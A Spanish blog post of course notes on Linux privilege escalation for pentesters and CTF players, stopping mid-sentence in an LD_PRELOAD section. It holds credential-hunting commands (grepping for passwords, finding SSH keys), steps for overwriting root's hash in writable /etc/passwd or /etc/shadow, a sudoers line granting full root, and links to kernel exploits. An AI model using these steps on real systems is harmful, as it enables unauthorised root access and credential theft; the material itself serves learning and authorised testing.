<!DOCTYPE html><html lang="es" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Linux Privilege Escalation ‚ù§" /><meta name="author" content="sha16" /><meta property="og:locale" content="es" /><meta name="description" content="Estas son mis notas del curso de The CyberMentor, Linux Privilege Escalation for Beginners, el cual recomiendo encarecidamente a todas las personas que se est√°n reci√©n iniciando en el √°rea del pentesting, red team, CTFs, etc." /><meta property="og:description" content="Estas son mis notas del curso de The CyberMentor, Linux Privilege Escalation for Beginners, el cual recomiendo encarecidamente a todas las personas que se est√°n reci√©n iniciando en el √°rea del pentesting, red team, CTFs, etc." /><link rel="canonical" href="https://sha-16.github.io/posts/Linux-Privilege-Escalation-Basics/" /><meta property="og:url" content="https://sha-16.github.io/posts/Linux-Privilege-Escalation-Basics/" /><meta property="og:site_name" content="sha16" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-09-29T00:00:00-03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Linux Privilege Escalation ‚ù§" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"sha16"},"description":"Estas son mis notas del curso de The CyberMentor, Linux Privilege Escalation for Beginners, el cual recomiendo encarecidamente a todas las personas que se est√°n reci√©n iniciando en el √°rea del pentesting, red team, CTFs, etc.","url":"https://sha-16.github.io/posts/Linux-Privilege-Escalation-Basics/","@type":"BlogPosting","headline":"Linux Privilege Escalation ‚ù§","dateModified":"2023-09-27T22:48:54-03:00","datePublished":"2022-09-29T00:00:00-03:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://sha-16.github.io/posts/Linux-Privilege-Escalation-Basics/"},"@context":"https://schema.org"}</script><title>Linux Privilege Escalation ‚ù§ | sha16</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="sha16"><meta name="application-name" content="sha16"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/sha-16.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">sha16</a></div><div class="site-subtitle font-italic">‚ù§ Pentester / Red Team</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/sha-16" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.youtube.com/channel/UCZrqUzohXiWRaJ7YdhVpZqA/videos" aria-label="youtube" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-youtube"></i> </a> <a href="https://twitch.tv/sha_16_/" aria-label="twitch" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-twitch"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG ‚Ä∫ <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Linux Privilege Escalation ‚ù§</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Linux Privilege Escalation ‚ù§</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> sha16 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Sep 29, 2022, 12:00 AM -0300" >Sep 29, 2022<i class="unloaded">2022-09-29T00:00:00-03:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Wed, Sep 27, 2023, 10:48 PM -0300" >Sep 27<i class="unloaded">2023-09-27T22:48:54-03:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4023 words">22 min read</span></div></div><div class="post-content"><p>Estas son mis notas del curso de <em>The CyberMentor</em>, <a href="https://academy.tcm-sec.com/p/linux-privilege-escalation">Linux Privilege Escalation for Beginners</a>, el cual recomiendo encarecidamente a todas las personas que se est√°n reci√©n iniciando en el √°rea del pentesting, red team, CTFs, etc.</p><p>Para todos aquellos que ya tengan un tiempo en el √°rea, cr√©anme que ser√° un excelente repaso de conceptos b√°sicos‚Ä¶</p><hr /><h1 id="god-level-resources-">God Level Resources üíØ</h1><p><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux Privilege Escalation - HackTricks</a></p><p><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">Privilege Escalation - Linux ¬∑ Total OSCP Guide</a></p><p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">PayloadsAllTheThings/Linux - Privilege Escalation.md at master ¬∑ swisskyrepo/PayloadsAllTheThings</a></p><p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation - g0tmi1k</a></p><p><a href="https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources">TCM-Course-Resources/Linux-Privilege-Escalation-Resources: Compilation of Resources for TCM‚Äôs Linux Privilege Escalation course</a></p><hr /><h1 id="system-enumeration">System Enumeration</h1><p><em>Enumeraci√≥n de informaci√≥n importante del sistema: versi√≥n de sistema operativo y kernel, componentes, CPU, variables de entorno, procesos y subprocesos asociados a usuarios/daemons.</em></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="c"># Operating System &amp; Kernel Information</span>
<span class="nb">uname</span> <span class="nt">-a</span>
lsb_release <span class="nt">-a</span>
<span class="nb">cat</span> /proc/version
<span class="nb">cat</span> /etc/issue
lscpu
<span class="nb">cat</span> /etc/os-release

<span class="c"># Check Environment Variables</span>
<span class="nb">env
export</span>

<span class="c"># Check mounts</span>
<span class="nb">df</span> <span class="nt">-h</span>
findmnt
findmnt <span class="nt">-l</span>
findmnt <span class="nt">-D</span>
findmnt <span class="nt">-s</span>

<span class="c"># Installed Dependencies -&gt; Check versions</span>
dpkg <span class="nt">-l</span>

<span class="c"># Process &amp; Subprocess</span>
ps aux
ps <span class="nt">-faux</span>
ps <span class="nt">-eo</span> uid,user,pid,cmd
ps faux | <span class="nb">grep </span>root
</pre></table></code></div></div><h1 id="user-enumeration">User Enumeration</h1><p><em>Recopilaci√≥n de informaci√≥n importante acerca de los usuarios y grupos del sistema, archivos y directorios, privilegios SUDO.</em></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c"># User &amp; Groups</span>
<span class="nb">whoami
id</span>

<span class="c"># Check Users Resources</span>
<span class="nb">ls</span> <span class="nt">-la</span> /home/
<span class="nb">ls</span> <span class="nt">-la</span> /home/&lt;user&gt;

<span class="c"># Check SUDO privileges</span>
<span class="nb">sudo</span> <span class="nt">-l</span> 

<span class="c"># Users &amp; Daemons </span>
<span class="nb">cat</span> /etc/passwd

<span class="c"># Check if you can escalate with this form</span>
su -
</pre></table></code></div></div><h1 id="networking-enumeration">Networking Enumeration</h1><p><em>Informaci√≥n acerca de la red en la que se encuentra el servidor, interfaces de red, conexiones locales, puertos internos y externos, enumeraci√≥n de equipos en la red v√≠a ARP.</em></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c"># Local Interfaces &amp; Network Information</span>
ifconfig
ip a
route
ip route
ip neigh
<span class="nb">hostname</span> <span class="nt">-I</span>
<span class="nb">cat</span> /etc/hosts

<span class="c"># Local connections (TCP &amp; UDP)</span>
netstat <span class="nt">-nat</span>
netstat <span class="nt">-ano</span>

<span class="c"># Hosts via ARP Scan</span>
arp <span class="nt">-a</span>
arp-scan <span class="nt">-I</span> &lt;network-interface&gt; <span class="nt">-l</span> 
</pre></table></code></div></div><h1 id="password-hunting">Password Hunting</h1><p><em>B√∫squeda recursiva de credenciales hardcodeadas en el sistema de archivos del sistema operativo.</em></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="c"># Looking for hardcoded credentials</span>
<span class="nb">grep</span> <span class="nt">-riE</span> <span class="s2">"passwd|password|pass|creds|credentials|dbconnect|connection"</span> / 2&gt;/dev/null
<span class="nb">grep</span> <span class="nt">-rnwieE</span> <span class="nt">--color</span><span class="o">=</span>always <span class="s2">"passwd|password|pass|creds|credentials|dbconnect|connection"</span> / 2&gt;/dev/null
<span class="nb">grep</span> <span class="nt">-ri</span> <span class="s2">"passord"</span> / 2&gt;/dev/null
<span class="nb">grep</span> <span class="nt">-rnwie</span> <span class="nt">--color</span><span class="o">=</span>always <span class="s2">"PASSWORD"</span> / 2&gt;/dev/null
<span class="nb">grep</span> <span class="nt">-rnwieE</span> <span class="nt">--color</span><span class="o">=</span>always <span class="s2">"PASSWORD=|PASS="</span> / 2&gt;/dev/null

<span class="c"># Looking Password Files</span>
locate key
locate id_rsa
locate credentials 
locate password
whereis password
whereis credentials

<span class="c"># Looking Credentials in Environment Variables</span>
<span class="nb">env</span> | <span class="nb">grep</span> <span class="nt">-iE</span> <span class="s1">'pass|password'</span>
<span class="nb">export</span> | <span class="nb">grep</span> <span class="nt">-iE</span> <span class="s1">'pass|password'</span>

<span class="c"># Look for configuration files (eg: wp-config.php)</span>
locate config

<span class="c"># Find SSH Files</span>
find / <span class="nt">-name</span> id_rsa 2&gt;/dev/null
find / <span class="nt">-name</span> id_rsa.pub 2&gt;/dev/null
find / <span class="nt">-name</span> authorized_keys 2&gt;/dev/null
find / <span class="nt">-name</span> known_hosts 2&gt;/dev/null

<span class="c"># Always check history commands user</span>
<span class="nb">history
cat</span> /home/&lt;user&gt;/.bash_history
</pre></table></code></div></div><hr /><h1 id="automated-enumeration-tools">Automated Enumeration Tools</h1><p><em>This tools are very useful to locate possible attack vectors for privilege escalation:</em></p><ul><li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">PEASS-ng/linPEAS at master ¬∑ carlospolop/PEASS-ng</a><li><a href="https://github.com/diego-treitos/linux-smart-enumeration">diego-treitos/linux-smart-enumeration: Linux enumeration tool for pentesting and CTFs with verbosity levels</a><li><a href="https://github.com/rebootuser/LinEnum">rebootuser/LinEnum: Scripted Local Linux Enumeration &amp; Privilege Escalation Checks</a><li><a href="https://github.com/mzet-/linux-exploit-suggester">mzet-/linux-exploit-suggester: Linux privilege escalation auditing tool</a><li><a href="https://github.com/sleventyeleven/linuxprivchecker">sleventyeleven/linuxprivchecker: linuxprivchecker.py ‚Äì a Linux Privilege Escalation Check Script</a></ul><hr /><h1 id="kernel-exploits">Kernel Exploits</h1><h2 id="qu√©-es-el-kernel">¬øQu√© es el Kernel?</h2><p>Es el componente principal de un sistema operativo que tiene control de todo.</p><p>Su rol m√°s importante es facilitar la comunicaci√≥n e interacci√≥n entre los distintos componentes de una computadora, abarcando desde el hardware hasta el software, permitiendo que estos funcionen en conjunto correctamente.</p><p><img data-proofer-ignore data-src="https://upload.wikimedia.org/wikipedia/commons/8/8f/Kernel_Layout.svg" alt="Linux Kernel" /></p><h2 id="common-linux-kernel-exploits">Common Linux Kernel Exploits</h2><p><em>Este es un repositorio con los exploits de Kernel m√°s comunes en sistemas operativos GNU/Linux.</em></p><p>Un buen punto a tener en cuenta siempre, es que si la versi√≥n del Kernel es antigua, 4.8.3 hacia abajo, probablemente es vulnerable a DirtyCow. Por lo tanto, si tienes un servidor con un Kernel Linux 2.X / 3.X, date por seguro que hay una vulnerabilidad DirtyCow.</p><p><strong>Linux Kernel Exploits:</strong> <a href="https://github.com/lucyoa/kernel-exploits">https://github.com/lucyoa/kernel-exploits</a></p><h3 id="linux-exploit-suggester">Linux Exploit Suggester</h3><p>Es una herramienta que nos permite enumerar vectores de escalaci√≥n de privilegios a trav√©s de exploits para componentes vulnerables del sistema operativo, o del mismo kernel.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>./linux-exploit-suggester.sh 
</pre></table></code></div></div><h3 id="other-exploits">Other Exploits</h3><p><a href="https://github.com/ly4k/PwnKit">ly4k/PwnKit: Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation</a></p><p><a href="https://github.com/briskets/CVE-2021-3493">briskets/CVE-2021-3493: Ubuntu OverlayFS Local Privesc</a></p><hr /><h1 id="passwords--file-permissions">Passwords &amp; File Permissions</h1><p>Si tenemos privilegios de escritura en los archivos <code class="language-plaintext highlighter-rouge">/etc/passwd</code> o <code class="language-plaintext highlighter-rouge">/etc/shadow</code>, tenemos una vulnerabilidad misconfiguration que nos permitir√° cambiar las contrase√±as de los usuarios y escalar privilegios en el servidor.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@tryit-sharing:~# <span class="nb">ls</span> <span class="nt">-l</span> /etc/<span class="o">{</span>passwd,shadow<span class="o">}</span>                                                                                                       
<span class="nt">-rw-r--rw-</span> 1 root root   1491 Sep 24 00:06 /etc/passwd                                                                                                 
<span class="nt">-rw-r--rw-</span> 1 root shadow  780 Sep 24 00:06 /etc/shadow
</pre></table></code></div></div><p>Lo suyo es generar un hash de tipo crypt, o bcrypt, y remplazarlo en los campos de contrase√±a en cualquiera de los dos archivos (siempre que podamos escribir en ellos). Para generar nuestra contrase√±a cifrada posemos utilizar:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># Algoritmo DES (crypt)</span>
openssl passwd &lt;new-password&gt;

<span class="c"># Algoritmo sha-512 (crypt)</span>
mkpasswd &lt;new-password&gt;
</pre></table></code></div></div><p>Para editar un archivo tienes que utilizar un editor de texto el cual, como su mismo nombre lo indica, te permitir√° modificar el contenido del fichero. Entre los m√°s conocidos tienes: <code class="language-plaintext highlighter-rouge">nano</code>, <code class="language-plaintext highlighter-rouge">vim</code>, <code class="language-plaintext highlighter-rouge">micro</code> y <code class="language-plaintext highlighter-rouge">nvim</code>.</p><p>Para el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> ser√≠a remplazar la <code class="language-plaintext highlighter-rouge">x</code> por el hash generado:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="c"># Contenido del archivo original</span>
root:x:0:0:root:/root:/bin/bash                                                                                                                        
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                        
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                   
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                                   
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync                                                                                                                     
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
<span class="o">[</span>REDACTED]

<span class="c"># Deber√≠a quedar as√≠ luego de modificarlo...</span>
root:jKw6eSezZulQU:0:0:root:/root:/bin/bash                                                                                                                        
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                                                        
bin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                                                   
sys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                                                   
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync                                                                                                                     
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
<span class="o">[</span>REDACTED]
</pre></table></code></div></div><p>En el caso del fichero <code class="language-plaintext highlighter-rouge">/etc/shadow</code> ser√≠a remplazar el asterisco (<code class="language-plaintext highlighter-rouge">*</code>), o el hash que se encuentre, por la contrase√±a cifrada que hemos creado:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c"># Contenido del archivo original</span>
root:<span class="k">*</span>:19258:0:99999:7:::                                                                                                                              
daemon:<span class="k">*</span>:19258:0:99999:7:::                                                                                                                            
bin:<span class="k">*</span>:19258:0:99999:7:::                                                                                                                               
sys:<span class="k">*</span>:19258:0:99999:7:::                                                                                                                               
<span class="nb">sync</span>:<span class="k">*</span>:19258:0:99999:7:::
...
<span class="o">[</span>REDACTE]

<span class="c"># Deber√≠a quedar as√≠ luego de modificarlo...</span>
root:jKw6eSezZulQU:19258:0:99999:7:::                                                                                                                              
daemon:<span class="k">*</span>:19258:0:99999:7:::                                                                                                                            
bin:<span class="k">*</span>:19258:0:99999:7:::                                                                                                                               
sys:<span class="k">*</span>:19258:0:99999:7:::                                                                                                                               
<span class="nb">sync</span>:<span class="k">*</span>:19258:0:99999:7:::
...
<span class="o">[</span>REDACTE]
</pre></table></code></div></div><p>Luego de reemplazar el archivo s√≥lo habr√≠a que autenticarnos con el usuario e indicar la contrase√±a que establecimos en el archivo (obviamente su valor real, no el hash üòÖ):</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>su &lt;user&gt;
</pre></table></code></div></div><p>Si tienes dudas sobre la explotaci√≥n te recomiendo mirar este video que sub√≠ hace alg√∫n tiempo a YouTube: <a href="https://youtu.be/eksxwYF8OCQ">https://youtu.be/eksxwYF8OCQ</a></p><p>Otro archivo que es susceptible a escalaci√≥n de privilegios mediante permisos de escritura es el <code class="language-plaintext highlighter-rouge">/etc/sudoers</code>. Para esto bastar√≠a con a√±adir la siguiente l√≠nea en el mismo:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;user&gt; <span class="nv">ALL</span><span class="o">=(</span>ALL:ALL<span class="o">)</span> ALL
</pre></table></code></div></div><p>A√±adiendo esto podremos ejecutar cualquier comando con el usuario <code class="language-plaintext highlighter-rouge">root</code> a partir del programa <code class="language-plaintext highlighter-rouge">sudo</code>.</p><p>Cualquiera de las opciones que se presentan a continuaci√≥n servir√° para entablar una sesi√≥n con el usuario <code class="language-plaintext highlighter-rouge">root</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>su
<span class="nb">sudo</span> /bin/bash
<span class="nb">sudo</span> <span class="nt">-u</span> root /bin/bash
<span class="nb">sudo</span> /bin/sh
<span class="nb">sudo</span> <span class="nt">-u</span> root /bin/sh
</pre></table></code></div></div><hr /><h1 id="ssh-keys-misconfiguration">SSH Keys Misconfiguration</h1><p>Cuando un host posee servicios SSH podemos buscar ciertos misconfiguration que nos podr√≠a permitir pivotar de usuario en el sistema, o bien, directamente escalar privilegios.</p><p>Para verificar esto, siempre es importante que chequemos:</p><ul><li>Si tenemos privilegios de escritura en un archivo <code class="language-plaintext highlighter-rouge">authorized_keys</code>, ya sea del usuario <code class="language-plaintext highlighter-rouge">root</code> u otro, podemos autenticarnos con el mismo mediante el servicio SSH. Para esto debemos modificarlo, colocar nuestra clave p√∫blica dentro del mismo y autenticarnos con nuestra clave privada indicando el usuario.<li>Lo otro ser√≠a enumerar archivos con claves ID RSA para probar autenticarnos como otro usuario en el servidor, ya sea efectuando movimiento lateral o vertical (es importante checar si es que existen backups).</ul><hr /><h1 id="abusing-sudo-privileges">Abusing SUDO Privileges</h1><p>Es posible abusar de distintos binarios del sistema operativo cuando se pueden ejecutar en el contexto de otro usuario mediante SUDO, o privilegios SUID (que ser√°n explicados m√°s adelante).</p><p>Para esto puedes checar el sitio <strong>GTFOBins</strong> donde se describen las distintas formas que existen para abusar de los mismos y explotarlos:</p><ul><li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></ul><p>Por otra parte puede checar algunas hojas de trucos donde se describen formas comunes de escalar privilegios mediante SUDO:</p><ul><li><a href="https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/">Abusing SUDO (Linux Privilege Escalation) - Touhid‚Äôs Blog</a></ul><h2 id="privilege-escalation-v√≠a-sudo--ld_preload">Privilege Escalation v√≠a SUDO + LD_PRELOAD</h2><p>A trav√©s de la variable de entorno LD_PRELOAD se pueden especificar los binarios de las bibliotecas compartidas, las cuales son cargadas en memoria antes de que un binario sea ejecutado. Estas ser√°n ejecutada antes de la ejecuci√≥n del programa real que se invoc√≥. De esta manera, si un usuario es capaz de modificar dicha variable de entorno, ser√° capaz de utilizarla para escalar privilegios en el sistema.</p><p>Para esto lo primero que debemos hacer es checar si tenemos la capacidad de modificar la variable de entorno por medio del comando <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p><p>Si en el output del comando visualizamos <code class="language-plaintext highlighter-rouge">env_keep+=LD_PRELOAD</code>, es porque podemos explotar la vulnerabilidad.</p><p>Para realizarlo, bastar√≠a con computar un binario que ejecute lo siguiente: por una parte eliminar el valor actual de la variable <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code>, establecer el UID y GID en <code class="language-plaintext 